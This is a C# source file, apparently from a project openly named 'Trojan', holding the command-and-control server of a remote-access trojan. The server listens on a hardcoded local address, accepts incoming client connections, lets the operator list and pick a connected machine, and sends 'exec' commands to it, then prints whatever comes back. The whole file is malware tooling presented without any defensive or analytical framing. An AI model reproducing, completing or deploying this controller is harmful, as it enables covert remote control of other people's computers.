using System;
using System.Net;
using System.Text;
using System.Net.Sockets;
using Trojan.exceptions;
using SocketData;

namespace Trojan.server
{
    public class Server : SocketHandler
    {
        public socketSetup Listener;
        public Socket? connectedToClient;

        protected string? CMD = null;

        public async Task Send_Socket()
        {
            if (Listener.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(Listener.sock));

            bool failedCMD;
            bool sendCMD;
            while (ServerStatus == ServerStatus.RUNNING)
            {
                failedCMD = false;
                sendCMD = false;
                try
                {
                    await Task.Delay(300);
                    Console.Write("\r\nEnter command:\t");
                    CMD = Console.ReadLine();

                    if (CMD != null)
                    {
                        try
                        {
                            if (TruncationCheckCommand(CMD, 0, 5) == "local")
                            {
                                if (TruncationCheckCommand(CMD, 6, 3) == "cls" || TruncationCheckCommand(CMD, 6, 5) == "clear")
                                {
                                    Console.Clear();
                                }
                                else if (TruncationCheckCommand(CMD, 6, 4) == "exit")
                                {
                                    Environment.Exit(0);
                                }
                                else if (TruncationCheckCommand(CMD, 6, 4) == "help")
                                {
                                    // Display help menu
                                }
                            }
                            else if (TruncationCheckCommand(CMD, 0, 4) == "conn" || TruncationCheckCommand(CMD, 0, 7) == "connect")
                            {
                                string[] arguments = CMD.Substring(3).Split(" ");

                                int connectSelection;
                                int.TryParse(arguments[1], out connectSelection);

                                int ConnectIndex = connectSelection - 1;
                                if (ConnectIndex >= ConnectionManager.connections.Count())
                                {
                                    Console.WriteLine("\n[|] connection [{0}] doesnt exist", ConnectIndex + 1);
                                    continue;
                                }

                                if (connectedToClient != ConnectionManager.connections[ConnectIndex].getConn())
                                {
                                    connectedToClient = ConnectionManager.connections[ConnectIndex].getConn();
                                    Console.WriteLine("\n[+] Connected to :: {0} ;", connectedToClient.RemoteEndPoint);
                                }
                                else
                                {
                                    Console.WriteLine("\n[|] You are already connected to connection[" + (ConnectIndex + 1) + "]");
                                }
                            }
                            else if (TruncationCheckCommand(CMD, 0, 4) == "exec")
                            {
                                string[] arguments = CMD.Substring(3).Split(" ");

                                string SelectedCommand = arguments[1];

                                sendCMD = true;
                            }
                            else if (TruncationCheckCommand(CMD, 0, 2) == "do")
                            {
                                string[] arguments = CMD.Substring(1).Split(" ");

                                string SelectedCommand = arguments[1];

                                if (SelectedCommand == "list")
                                {
                                    int IncrementalCounter = 0;
                                    int RangeCounter = -1;

                                    if (2 < arguments.Length)
                                    {
                                        string ConnListCount = arguments[2];

                                        // TryParse returns 0 if parsing fails
                                        // Use this to decide if second parameter is set or not
                                        int.TryParse(ConnListCount, out RangeCounter);
                                    }

                                    foreach (ConnectionSetup connection in ConnectionManager.connections)
                                    {
                                        if (RangeCounter != 0)
                                        {
                                            IncrementalCounter++;
                                        }
                                        else { break; }

                                        Console.WriteLine("\n\t\t" + connection.getRemoteEndPoint() + " [" + IncrementalCounter + "]");
                                        Console.WriteLine("\t\t" + new string('*', connection.getRemoteEndPoint().ToString().Length));

                                        if (IncrementalCounter == RangeCounter) break;
                                    }
                                }
                            }
                        }
                        catch (Exception error) { Console.WriteLine(error); failedCMD = true; }

                        if (connectedToClient != null && !failedCMD && sendCMD == true)
                        {
                            await connectedToClient.SendAsync(Encoding.UTF8.GetBytes(CMD), SocketFlags.None);
                            SenderStatus = ServerStatus.WAITRESPONSE;
                        }
                    }
                }
                catch (Exception error)
                {
                    Console.WriteLine("\n\n[-] Send_Socket failed to send :: {0} :: {1} ;\n\n", nameof(error), error.ToString());
                }
            }
        }

        public async Task Receive_Socket()
        {
            ConnectionSetup CurrentConnection;
            while (ServerStatus == ServerStatus.RUNNING)
            {
                await Task.Delay(EVENT_CHECK_INTERVAL);

                if (SenderStatus == ServerStatus.WAITRESPONSE)
                {
                    for (int i = 0; i < ConnectionManager.connections.Count(); i++)
                    {
                        CurrentConnection = ConnectionManager.connections[i];
                        await CurrentConnection.getConn().ReceiveAsync(CurrentConnection.getBuffer(), SocketFlags.None);

                        string message = Encoding.UTF8.GetString(CurrentConnection.getBuffer()).Replace("\0", "");
                        if (CurrentConnection.getBuffer().Length > 0 && message.Length > 0)
                        {
                            ConnectionManager.DataQueue.Enqueue(message);
                            Array.Clear(CurrentConnection.getBuffer(), 0, CurrentConnection.getBuffer().Length);
                        }
                        else
                        {
                            throw new ExceptionHandler("[-] ReceiveTask timed out : " + nameof(CurrentConnection));
                        }
                    }

                    ConnectionManager.OutputDataQueue();
                    SenderStatus = ServerStatus.IDLE;
                }
            }
        }

        public void Init_Server(ushort port, uint buffSize)
        {
            Listener = _SocketOperations.Init_Socket(IPAddress.Parse("192.168.0.35"), new socketSetup(Guid.NewGuid().ToString(), port, buffSize));

            if (Listener.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(Listener.sock));

            _SocketOperations.Bind_Socket(Listener);
            _SocketOperations.Listen_Socket(ref Listener.sock, MAX_CONNECTIONS);

            Console.WriteLine("[+] Started listening on port :: {0} ;", Listener.port);

            SenderStatus = ServerStatus.WAITRESPONSE;

            Task.Factory.StartNew(() => _SocketOperations.Accept_Socket(Listener, SenderStatus));
            Task.Factory.StartNew(() => Receive_Socket());
            Task.Factory.StartNew(() => Send_Socket());

            ServerStatus = ServerStatus.RUNNING;
        }
    }
}